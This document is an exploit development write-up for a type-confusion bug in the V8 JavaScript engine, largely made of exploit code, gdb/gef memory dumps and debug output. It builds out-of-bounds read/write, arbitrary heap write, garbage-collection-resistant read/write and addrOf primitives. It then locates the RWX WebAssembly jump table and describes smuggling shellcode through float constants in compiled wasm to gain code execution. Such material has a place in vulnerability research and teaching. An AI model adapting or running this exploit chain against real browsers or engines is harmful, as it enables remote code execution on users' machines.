# Trigger

Successfully trigger the type confusion:

```shell
Debug of corrupted_instance.x
DebugPrint: 0x118e00404bcd: [JSArray] in OldSpace
 - map: 0x118e0018f041 <Map[16](PACKED_ELEMENTS)> [FastProperties]
 - prototype: 0x118e0018e935 <JSArray[0]>
 - elements: 0x118e00404bf1 <FixedDoubleArray[1]> [PACKED_ELEMENTS]
             ^^^^^^^^^^^^^^
              same with a
 - length: 8
 - properties: 0x118e000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x118e00000d41: [String] in ReadOnlySpace: #length: 0x118e00025e2d <AccessorInfo name= 0x118e00000d41 <String[6]: #length>, data= 0x118e00000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x118e00404bf1 <FixedDoubleArray[1]> {
           0: -858993459
 }

Debug of corrupted_instance.x
DebugPrint: 0x118e00404c01: [JSArray] in OldSpace
 - map: 0x118e0018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x118e0018e935 <JSArray[0]>
 - elements: 0x118e00404bf1 <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS] <--- different elements kind
             ^^^^^^^^^^^^^^
              same with x
 - length: 1
 - properties: 0x118e000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x118e00000d41: [String] in ReadOnlySpace: #length: 0x118e00025e2d <AccessorInfo name= 0x118e00000d41 <String[6]: #length>, data= 0x118e00000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x118e00404bf1 <FixedDoubleArray[1]> {
           0: 1.1
 }
```

# Initial read-write primitives

Once the vulnerability is triggered, the same memory region is used for storing the backing buffer of an array with objects (x) as well as the backing buffer and metadata of a packed double array (a). This means that the length property of the packed double array a can be modified by writing to certain elements in the object array.

Look at the memory of JSArray again:

```shell
Debug of corrupted_instance.a
DebugPrint: 0x25a200404ccd: [JSArray] in OldSpace
 - map: 0x25a20018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x25a20018e935 <JSArray[0]>
 - elements: 0x25a200404cbd <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]
 - length: 1
 - properties: 0x25a2000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x25a200000d41: [String] in ReadOnlySpace: #length: 0x25a200025e2d <AccessorInfo name= 0x25a200000d41 <String[6]: #length>, data= 0x25a200000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x25a200404cbd <FixedDoubleArray[1]> {
           0: 1.1
 }
```

Memmory dump at elements:

```shell
gef➤  x/64x 0x25a200404cbd - 1
0x25a200404cbc:	0x00000851	0x00000002	0x9999999a	0x3ff19999
                  ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^
                  Map of FDA   length=1           1.1              <-- pointer tagging, length = 2 on memory
0x25a200404ccc:	0x0018efc1	0x000006cd	0x00404cbd	0x00000002
                  ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^
                  Map of JSArray                       length of JSArray <-- at offset 5
```

FDA stand for FixedDoubleArray.

The following code attempts to write `0x10000` to the length field of the object array:

```js
corrupted_instance.x[5] = 0x10000;
```

Output:

```shell
[+] Triggering the bug...
[+] Corrupting the metadata (length) of corrupted_instance.a ..
[+] Initial corruption succeeded!
Debug of corrupted_instance.x
DebugPrint: 0x17f900404c3d: [JSArray] in OldSpace
 - map: 0x17f90018f041 <Map[16](PACKED_ELEMENTS)> [FastProperties]
 - prototype: 0x17f90018e935 <JSArray[0]>
 - elements: 0x17f900404c61 <FixedDoubleArray[1]> [PACKED_ELEMENTS]
 - length: 8
 - properties: 0x17f9000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x17f900000d41: [String] in ReadOnlySpace: #length: 0x17f900025e2d <AccessorInfo name= 0x17f900000d41 <String[6]: #length>, data= 0x17f900000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x17f900404c61 <FixedDoubleArray[1]> {
           0: -858993459
 }

Debug of corrupted_instance.a
DebugPrint: 0x17f900404c71: [JSArray] in OldSpace
 - map: 0x17f90018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x17f90018e935 <JSArray[0]>
 - elements: 0x17f900404c61 <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]
 - length: 65536 <---- 0x10000
 - properties: 0x17f9000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x17f900000d41: [String] in ReadOnlySpace: #length: 0x17f900025e2d <AccessorInfo name= 0x17f900000d41 <String[6]: #length>, data= 0x17f900000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x17f900404c61 <FixedDoubleArray[1]> {
           0: 1.1
 }
```

Once the length of the array is overwritten, out of bounds read/write can be performed, relative to the position of the backing element buffer of the array. To make use of this, the exploit allocates another packed double array and **finds the offset and the element index to reach its metadata from the start of the elements buffer of the corrupted array**.

```js
print("Perfoming read/write out of bounds...");
while (true) {
   let rwarr = [1.1, 2.2, 3.3];
   let rwarr_addr = addrof_tmp(rwarr);
   let a_addr = addrof_tmp(corrupted_instance.a);

   // If our target array to corrupt does not lie after our corrupted array, then
   // we can't do anything. Bail and retry the exploit.
   if (rwarr_addr < a_addr) {
      // print("[+] Target array does not lie after corrupted array. Retrying...");
   } else {
      print(`[+] Address of corrupted_instance.a: 0x${a_addr.toString(16)}`);
      print(`[+] Address of rwArr: 0x${rwarr_addr.toString(16)}`);
      debug_print(`corrupted_instance.a`, corrupted_instance.a);
      debug_print(`rwarr`, rwarr);
      print("[+] Calculating the offset...");
      let offset = (rwarr_addr - a_addr) + 0xc; // 0xc is the offset from the metadata to the backing storage
      if ((offset % 8) != 0) {
            offset -= 4; // turn back 4 bytes if the offset is not divisible by 8 (each element is 8 bytes long),
            // because we need to convert it to number of elements
            // used for changing the backing storage of rwarr through corrupted_instance.a
      }
      print("[+] Offset: " + offset);

      let marker42_idx = offset / 8; // idex of backing storage of corrupted_instance.a
      // marker42_idx += 9; // no need
      break;
   }
}
```

Debug print out both buffers:

```shell
DebugPrint: 0x3ba1001a5d15: [JSArray] in OldSpace
 - map: 0x3ba10018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x3ba10018e935 <JSArray[0]>
 - elements: 0x3ba1001a5d05 <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]
 - length: 65536
 - properties: 0x3ba1000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x3ba100000d41: [String] in ReadOnlySpace: #length: 0x3ba100025e2d <AccessorInfo name= 0x3ba100000d41 <String[6]: #length>, data= 0x3ba100000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x3ba1001a5d05 <FixedDoubleArray[1]> {
           0: 1.1
 }

Debug of rwarr
DebugPrint: 0x3ba1002c267d: [JSArray]
 - map: 0x3ba10018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x3ba10018e935 <JSArray[0]>
 - elements: 0x3ba1002c265d <FixedDoubleArray[3]> [PACKED_DOUBLE_ELEMENTS]
 - length: 3
 - properties: 0x3ba1000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x3ba100000d41: [String] in ReadOnlySpace: #length: 0x3ba100025e2d <AccessorInfo name= 0x3ba100000d41 <String[6]: #length>, data= 0x3ba100000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x3ba1002c265d <FixedDoubleArray[3]> {
           0: 1.1
           1: 2.2
           2: 3.3
 }

[+] Calculating the offset...
[+] Offset: 1165680
[+] Address of backing storage pointer of rwarr: 2c2684
```

First, we calculate the address of the backing storage pointer of `rwarr` from `rwarr_addr`:

```shell
gef➤  x/12x 0x3ba1002c267d - 1 + 8
0x3ba1002c2684:	0x002c265d	0x00000006	0x00001085	0x001a5d51
                  ^^^^^^^^^^
                  elements
0x3ba1002c2694:	0x000007b1	0x002c267d	0x3ff19999	0x000007b1
0x3ba1002c26a4:	0x001a5d15	0x3ff19999	0x000005dd	0x0000000e
```

Then, add `a_addr` with the offset to get the same address:

```shell
gef➤  p 0x3ba1001a5d15 -1 + 1165680
$12 = 0x3ba1002c2684
```

After that, the offset from the backing storage of `corrupted_instance.a` to get the same address need to be added by 16:

```shell
gef➤  p 0x3ba1001a5d05 - 1 + 1165680 + 16
$14 = 0x3ba1002c2684
```

The reason is that the backing storage of `corrupted_instance.a` is 16 bytes before the JSArray object.

```shell
gef➤  x/24x 0x3ba1001a5d05 - 1
0x3ba1001a5d04:	0x00000851	0x00000002	0x001a5d15	0x3ff19999
                  ^^^^^^^^^^                                      
                  Map of FixedDoubleArray                         
0x3ba1001a5d14:	0x0018efc1	0x000006cd	0x001a5d05	0x00020000
                  ^^^^^^^^^^
                  Map of JSArray
0x3ba1001a5d24:	0x001a357d	0x001a357d	0x00000a09	0x00000000
0x3ba1001a5d34:	0x000015d5	0x00028991	0x001a5d2d	0x0018efc1
0x3ba1001a5d44:	0x000006cd	0x002c2149	0x00000006	0x0000150d
0x3ba1001a5d54:	0x001a5d41	0x00000000	0x002c2615	0x00000001
```

We convert the above calculation into this:

```shell
gef➤  p 0x3ba1001a5d05 - 1 + 1165696
$15 = 0x3ba1002c2684
```

And into this:

```shell
gef➤  p 0x3ba1001a5d05 - 1 + 145712*8
$16 = 0x3ba1002c2684
```

Where `145712` is our index of the element that points to the backing storage of rwarr.

Now, we have the ability to point to any memory address as we want through `corrupted_instance.a[145712]`.

If the elements pointer of this array is modified to point to a specific value, then writing to an index in the rwarr will write a controlled float to this chosen address thereby achieving an arbitrary write in the V8 heap.

```js
function v8h_write64(where, what) {
    helper.f64[0] = corrupted_instance.a[marker42_idx];
    if (helper.u32[0] == 0x6) {
        helper.f64[0] = corrupted_instance.a[marker42_idx - 1];
        helper.u32[1] = where - 8;
        corrupted_instance.a[marker42_idx - 1] = helper.f64[0];
    } else if (helper.u32[1] == 0x6) {
        helper.u32[0] = where - 8;
        corrupted_instance.a[marker42_idx] = helper.f64[0];
    }
    rwarr[0] = what;
}
```

The first if statement:

```shell
gef➤  x/12x 0x3cb6001a5fd5 -1 + 8*145717
0x3cb6002c297c:	0x00000006	0x00001085	0x001a6021	0x000007b1
                  ^^^^^^^^^^  ^^^^^^^^^^
                    u32[0]      u32[1]
0x3cb6002c298c:	0x002c2971	0x3ff19999	0x000007b1	0x001a5fe5
0x3cb6002c299c:	0x3ff19999	0x00000155	0x00000003	0x0000001d
gef➤  x/12x 0x3cb6001a5fd5 -1 + 8*145717 - 8
0x3cb6002c2974:	0x000006cd	0x002c2951	0x00000006	0x00001085
                              ^^^^^^^^^^  
                             u32[1]=where-8    
0x3cb6002c2984:	0x001a6021	0x000007b1	0x002c2971	0x3ff19999
0x3cb6002c2994:	0x000007b1	0x001a5fe5	0x3ff19999	0x00000155
```

The else if statement:

```shell
gef➤  x/12x 0x3cb6001a5fd5 -1 + 8*145717 - 4
0x3cb6002c2978:	0x002c2951	0x00000006	0x00001085	0x001a6021
                  ^^^^^^^^^^  ^^^^^^^^^^
                u32[0]=where-8   u32[1]
0x3cb6002c2988:	0x000007b1	0x002c2971	0x3ff19999	0x000007b1
0x3cb6002c2998:	0x001a5fe5	0x3ff19999	0x00000155	0x00000003
```

Try to write something:

```js
print("[+] Writing data...");
let data = 13.37;                                    // have to be float because rwarr is a float array
let bufToBeWritten = [1.1, 2.2, 3.3, 4.4];
let bufToBeWritten_addr = addrof_tmp(bufToBeWritten);
v8h_write64(bufToBeWritten_addr - 1 + 0x10, data);   // 0x10 is offset of length of JSArray
debug_print('bufToBeWritten', bufToBeWritten);
```

Calculating offset and index:

```shell
[+] Perfoming read and write out of bounds...
[+] Calculating the offset...
[+] Offset: 1298520
[+] Calculating the index...
[+] Index: 162316
[+] The approximately view of pointer's data: 0x13ffd1 0x6
```

Debug print of `bufToBeWritten`:

```shell
[+] Writing data...
Debug of bufToBeWritten
DebugPrint: 0x227005422c5: [JSArray]
 - map: 0x02270018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x02270018e935 <JSArray[0]>
 - elements: 0x0227005422dd <FixedDoubleArray[4]> [PACKED_DOUBLE_ELEMENTS]
 - length: 511705092 <---- it changed from 4
 - properties: 0x0227000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x22700000d41: [String] in ReadOnlySpace: #length: 0x022700025e2d <AccessorInfo name= 0x022700000d41 <String[6]: #length>, data= 0x022700000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x0227005422dd <FixedDoubleArray[4]> {
           0: 1.1
           1: 2.2
           2: 3.3
           3: 4.4
}
```

However both, the `addrof` as well as the write primitive depend on there being no garbage collection run after the successful trigger of the bug. This is because if a GC occurs, then it will move the objects in memory and primitives like corruption of the array elements will no longer work because the metadata and elements region of the array maybe moved to separate regions by the Garbage Collector. A GC can also crash the engine if it sees corrupted metadata like corrupted maps or array lengths or elements pointers.

# GC Resistant Primitives

After triggering GC for moving objects into old space:

```shell
Debug of holder
DebugPrint: 0x385d0019c909: [JS_OBJECT_TYPE] in OldSpace
Debug of changer
DebugPrint: 0x385d0019c931: [JSArray] in OldSpace
Debug of leaker
DebugPrint: 0x385d0019c921: [JSArray] in OldSpace
```

All of the objects are moved to old space.

Once the vulnerability is triggered, the exploit uses the initial `addrof` to find the address of the `changer`/`leaker`/`holder` objects. It then overwrites the elements pointer of the changer object to point to the address of the leaker `object` and also overwrites the elements pointer of leaker `object` to point to the address of the holder `object`. This corruption is done using the heap write primitive achieved in the previous section. The following code shows this.

Layout:

```js
+-------------------------------+
| Changer (Array)               |
|-------------------------------|
| Elements pointer ------------>|------------------------------+
| [1.1, 2.2, 3.3, 4.4, 5.5, 6.6]|                              |
+-------------------------------+                              |
                                                               |
                                                               |
+-------------------------------+                              |
| Leaker (Array)                |<-----------------------------+
|-------------------------------|
| Elements pointer ------------>|------------------------------+
| [1.1, 2.2, 3.3, 4.4, 5.5, 6.6]|                              |
+-------------------------------+                              |
                                                               |
                                                               |
+-------------------------------+                              |
| Holder (Object)               |<-----------------------------+
|-------------------------------|
| p1: 0x1234                    |
| p2: 0x1234                    |
| p3: 0x1234                    |
+-------------------------------+
```

Here is how we do it:

```js
changer_addr = addrof_tmp(changer);
leaker_addr = addrof_tmp(leaker);
holder_addr = addrof_tmp(holder);

helper.u32[1] = 0xc; helper.u32[0] = holder_addr;
original_holder_bytes = helper.f64[0];

helper.u32[1] = 0xc; helper.u32[0] = leaker_addr;
v8h_write64(changer_addr + 0x8, helper.f64[0]);                //0x8 is offset of `elements` pointer
v8h_write64(leaker_addr + 0x8, original_holder_bytes);
```

Output:

```shell
Debug of changer
DebugPrint: 0xa980019ca7d: [JSArray] in OldSpace
 - map: 0x0a980018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x0a980018e935 <JSArray[0]>
 - elements: 0x0a980019ca6d <JSArray[6]> [PACKED_DOUBLE_ELEMENTS]
 - length: 6
Debug of leaker
DebugPrint: 0xa980019ca6d: [JSArray] in OldSpace
 - map: 0x0a980018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x0a980018e935 <JSArray[0]>
 - elements: 0x0a980019ca55 <Object map = 0xa980019c2fd> [PACKED_DOUBLE_ELEMENTS]
 - length: 6
Debug of holder
DebugPrint: 0xa980019ca55: [JS_OBJECT_TYPE] in OldSpace
 - map: 0x0a980019c2fd <Map[24](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x0a9800184b21 <Object map = 0xa980018415d>
 - elements: 0x0a98000006cd <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x0a98000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0xa980019bdd9: [String] in OldSpace: #p1: 4660 (const data field 0), location: in-object
    0xa980019bde9: [String] in OldSpace: #p2: 4660 (const data field 1), location: in-object
    0xa980019bdf9: [String] in OldSpace: #p3: 4660 (const data field 2), location: in-object
 }
```

Also, remember to fix the corrupted arrays

```js
corrupted_instance.x.length = 0;
corrupted_instance.a.length = 0;
rwarr.length = 0;
```

Use new primitives to read/write:

```js
print("[+] Using new primitives to read data");
v8h_read64(bufToBeWritten_addr + 0x8);
print("[+] The original data: 0x" + helper.u32[0].toString(16) + " 0x" + helper.u32[1].toString(16));
debug_print('bufToBeWritten', bufToBeWritten);

print("[+] Using new primitives to write data");
v8h_write(bufToBeWritten_addr - 1 + 0x10, data);
debug_print('bufToBeWritten', bufToBeWritten);
```

Output:

```shell
[+] Using new primitives to read data
[+] The original data: 0x54223d
Debug of bufToBeWritten
DebugPrint: 0x2e5d00542225: [JSArray]
 - map: 0x2e5d0018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x2e5d0018e935 <JSArray[0]>
 - elements: 0x2e5d0054223d <FixedDoubleArray[4]> [PACKED_DOUBLE_ELEMENTS]
 - length: 4
 - properties: 0x2e5d000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x2e5d00000d41: [String] in ReadOnlySpace: #length: 0x2e5d00025e2d <AccessorInfo name= 0x2e5d00000d41 <String[6]: #length>, data= 0x2e5d00000061 <undefined>> (const accessor descriptor), location: descriptor
 }
[+] Using new primitives to write data
Debug of bufToBeWritten
DebugPrint: 0x2e5d00542225: [JSArray]
 - map: 0x2e5d0018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x2e5d0018e935 <JSArray[0]>
 - elements: 0x2e5d0054223d <FixedDoubleArray[4]> [PACKED_DOUBLE_ELEMENTS]
 - length: 109051908
 - properties: 0x2e5d000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x2e5d00000d41: [String] in ReadOnlySpace: #length: 0x2e5d00025e2d <AccessorInfo name= 0x2e5d00000d41 <String[6]: #length>, data= 0x2e5d00000061 <undefined>> (const accessor descriptor), location: descriptor
 }
```

Also, we can leak address with a new `addrOf` primitive:

```js
function addrOf(obj) {
    holder.p2 = obj;
    let ret = leaker[1];
    holder.p2 = 0;
    return helper.f64toi64(ret) & 0xffffffffn;
}
```

Output:

```shell
[+] The address of bufToBeWritten: 0x542205
Debug of bufToBeWritten
DebugPrint: 0x19a700542205: [JSArray]
 - map: 0x19a70018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x19a70018e935 <JSArray[0]>
 - elements: 0x19a70054221d <FixedDoubleArray[4]> [PACKED_DOUBLE_ELEMENTS]
 - length: 4
 - properties: 0x19a7000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x19a700000d41: [String] in ReadOnlySpace: #length: 0x19a700025e2d <AccessorInfo name= 0x19a700000d41 <String[6]: #length>, data= 0x19a700000061 <undefined>> (const accessor descriptor), location: descriptor
 }
```

# Shellcode

We need to find `jump_table_start` offset.

The memory on the heap:

```shell
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x00001d75e0000000 0x00001d75f0000000 0x0000000000000000 --- 
0x00002ee300000000 0x00002eeb00000000 0x0000000000000000 --- 
0x00002eeb00000000 0x00002eeb00010000 0x0000000000000000 r-- 
0x00002eeb00010000 0x00002eeb00020000 0x0000000000000000 --- 
0x00002eeb00020000 0x00002eeb00040000 0x0000000000000000 r-- 
0x00002eeb00040000 0x00002eeb00145000 0x0000000000000000 rw- 
0x00002eeb00145000 0x00002eeb00180000 0x0000000000000000 --- 
0x00002eeb00180000 0x00002eeb001c0000 0x0000000000000000 rw- 
0x00002eeb001c0000 0x00002eeb001cd000 0x0000000000000000 r-- 
0x00002eeb001cd000 0x00002eeb00200000 0x0000000000000000 --- 
0x00002eeb00200000 0x00002eeb002c3000 0x0000000000000000 rw- 
0x00002eeb002c3000 0x00002eeb00300000 0x0000000000000000 --- 
0x00002eeb00300000 0x00002eeb00680000 0x0000000000000000 rw- 
0x00002eeb00680000 0x00002eec00000000 0x0000000000000000 --- 
0x00002eec00000000 0x00002eec00100000 0x0000000000000000 rw- 
0x00002eec00100000 0x00002eee00000000 0x0000000000000000 --- 
0x00002eee00000000 0x00002eee02000000 0x0000000000000000 --- 
0x00002eee02000000 0x00002ff300000000 0x0000000000000000 --- 
0x0000360ffa27c000 0x0000360ffa27d000 0x0000000000000000 rwx  <---- RWX memory
0x0000360ffa27d000 0x0000360ffa27e000 0x0000000000000000 --- 
0x0000560f8ce2f000 0x0000560f8d281000 0x0000000000000000 r-- /home/aleister/Workspaces/v8-exploitation/v8/out/release-c21e8fe0c5b/d8
...
```

Layout of `WasmInstanceObject`:

```shell
DebugPrint: 0x2eeb00431da5: [WasmInstanceObject] in OldSpace
 - map: 0x2eeb00191215 <Map[208](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x2eeb001912c1 <Object map = 0x2eeb00431ff5>
 - elements: 0x2eeb000006a5 <FixedArray[0]> [HOLEY_ELEMENTS]
 - module_object: 0x2eeb00542465 <Module map = 0x2eeb001910ed>
 - exports_object: 0x2eeb00542545 <Object map = 0x2eeb00431f99>
 - native_context: 0x2eeb00183c51 <NativeContext[284]>
 - memory_objects: 0x2eeb000006a5 <FixedArray[0]>
 - tables: 0x2eeb000006a5 <FixedArray[0]>
 - indirect_function_tables: 0x2eeb000006a5 <FixedArray[0]>
 - imported_function_refs: 0x2eeb000006a5 <FixedArray[0]>
 - indirect_function_table_refs: 0x2eeb000006a5 <FixedArray[0]>
 - wasm_internal_functions: 0x2eeb00542515 <FixedArray[1]>
 - managed_object_maps: 0x2eeb00542539 <FixedArray[1]>
 - feedback_vectors: 0x2eeb000006a5 <FixedArray[0]>
 - well_known_imports: 0x2eeb000006a5 <FixedArray[0]>
 - memory0_start: 0x2feaffffffff
 - memory0_size: 0
 - new_allocation_limit_address: 0x560fa05a1db0
 - new_allocation_top_address: 0x560fa05a1da8
 - old_allocation_limit_address: 0x560fa05a1dc8
 - old_allocation_top_address: 0x560fa05a1dc0
 - imported_function_targets: 0x2eeb00000e19 <ByteArray[0]>
 - globals_start: 0x2feaffffffff
 - imported_mutable_globals: 0x2eeb00000e19 <ByteArray[0]>
 - indirect_function_table_size: 0
 - indirect_function_table_sig_ids: 0x2eeb00000e19 <ByteArray[0]>
 - indirect_function_table_targets: 0x2eeb0000604d <ExternalPointerArray[0]>
 - isorecursive_canonical_types: 0x560fa061e260
 - jump_table_start: 0x360ffa27c000
 - data_segment_starts: 0x2eeb00000e19 <ByteArray[0]>
 - data_segment_sizes: 0x2eeb00000e19 <ByteArray[0]>
 - element_segments: 0x2eeb000006a5 <FixedArray[0]>
 - hook_on_function_call_address: 0x560fa05b6a19
 - tiering_budget_array: 0x560fa05f2ed0
 - memory_bases_and_sizes: 0x2eeb00000e19 <ByteArray[0]>
 - break_on_entry: 0
 - properties: 0x2eeb000006a5 <FixedArray[0]>
 - All own properties (excluding elements): {}
```

Find RWX in WasInstanceObject:

```shell
gef➤  find 0x2eeb00431da5  - 1, 0x2eeb00431da5 + 100000, 0x0000360ffa27c000
0x2eeb00431dec
```

Calculate the offset:

```shell
gef➤  p 0x2eeb00431dec - 0x2eeb00431da5 + 1
$1 = 0x48
gef➤  p/u 0x2eeb00431dec - 0x2eeb00431da5 + 1
$2 = 72
```
The WebAssembly code:

```js
(module
  (func (export "addTwo") (result f64)
    f64.const 0x9090909090909090
	 f64.const 0xcccccccccccccccc
    f64.add))
```

Will have this compiled version:

```shell
gef➤  x/12x 0x360ffa27c000
0x360ffa27c000:	0x000b3be9	0x00000000	0x00000000	0x00000000
0x360ffa27c010:	0x00000000	0x00000000	0x00000000	0x00000000
0x360ffa27c020:	0x00000000	0x00000000	0x00000000	0x00000000
gef➤  x/12i 0x360ffa27c000
   0x360ffa27c000:	jmp    0x360ffa27cb40
   0x360ffa27c005:	add    BYTE PTR [rax],al
   0x360ffa27c007:	add    BYTE PTR [rax],al
   0x360ffa27c009:	add    BYTE PTR [rax],al
   0x360ffa27c00b:	add    BYTE PTR [rax],al
   0x360ffa27c00d:	add    BYTE PTR [rax],al
   0x360ffa27c00f:	add    BYTE PTR [rax],al
   0x360ffa27c011:	add    BYTE PTR [rax],al
   0x360ffa27c013:	add    BYTE PTR [rax],al
   0x360ffa27c015:	add    BYTE PTR [rax],al
   0x360ffa27c017:	add    BYTE PTR [rax],al
   0x360ffa27c019:	add    BYTE PTR [rax],al
gef➤  x/19i 0x360ffa27cb40
   0x360ffa27cb40:	push   rbp
   0x360ffa27cb41:	mov    rbp,rsp
   0x360ffa27cb44:	push   0x8
   0x360ffa27cb46:	push   rsi
   0x360ffa27cb47:	sub    rsp,0x10
   0x360ffa27cb4e:	cmp    rsp,QWORD PTR [r13-0x60]
   0x360ffa27cb52:	jbe    0x360ffa27cb91
   0x360ffa27cb58:	movabs r10,0x43e2121212121212
   0x360ffa27cb62:	vmovq  xmm0,r10
   0x360ffa27cb67:	movabs r10,0x43e999999999999a
   0x360ffa27cb71:	vmovq  xmm1,r10
   0x360ffa27cb76:	vaddsd xmm0,xmm0,xmm1
   0x360ffa27cb7a:	mov    r10,QWORD PTR [rsi+0x77]
   0x360ffa27cb7e:	sub    DWORD PTR [r10],0x3a
   0x360ffa27cb82:	js     0x360ffa27cb9c
   0x360ffa27cb88:	vmovsd xmm1,xmm1,xmm0
   0x360ffa27cb8c:	mov    rsp,rbp
   0x360ffa27cb8f:	pop    rbp
   0x360ffa27cb90:	ret
```

Also, we find the offset from jump_table_start to the exported function is `0xb40 = 2880`.

The constants declared in the WebAssembly code **can potentially be interpreted as assembly code** by jumping in the middle of an instruction, which is valid on machines that run Intel architecture. Hence with the RIP control described in the previous section, it is possible to **redirect the RIP into the middle of some compiled wasm code which has controlled float constants and interpret them as x86-64 instructions**.